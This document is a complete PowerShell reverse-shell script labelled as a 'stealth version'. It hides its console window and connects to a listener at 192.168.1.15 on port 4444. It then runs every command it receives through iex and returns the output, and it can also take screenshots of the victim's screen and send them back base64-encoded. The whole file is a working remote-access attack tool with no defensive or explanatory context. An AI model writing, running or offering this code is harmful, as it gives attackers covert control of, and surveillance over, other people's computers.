# --- ATOMIC LOCK-IN (STEALTH VERSION) ---
$ip = '192.168.1.15'
$port = 4444

# --- NEW: HIDE WINDOW ON START ---
$h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$type = Add-Type -MemberDefinition $h -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne 0) { $type::ShowWindow($hwnd, 0) } # 0 = SW_HIDE
# --------------------------------

# 1. SIMPLEST CONNECTION
$c = New-Object System.Net.Sockets.TCPClient
$c.Connect($ip, $port)
$s = $c.GetStream()
$r = New-Object System.IO.StreamReader($s)
$w = New-Object System.IO.StreamWriter($s)
$w.AutoFlush = $true

$w.WriteLine("--- STEALTH ACCESS GRANTED: $env:COMPUTERNAME ---")

# 2. THE ONLY LOOP
while($c.Connected) {
    $w.Write("PS " + (Get-Location).Path + "> ")
    $raw = $r.ReadLine()
    if ($null -eq $raw) { break }
    
    $cmd = $raw.Trim()
    if ($cmd -eq "exit") { break }

    # 3. DIRECT BRANCHING
    if ($cmd -eq "screenshot") {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
        $mem = New-Object System.IO.MemoryStream
        $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $out = [Convert]::ToBase64String($mem.ToArray())
        $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
    } 
    else {
        $out = iex $cmd 2>&1 | Out-String
    }

    $w.WriteLine($out)
}
$c.Close()
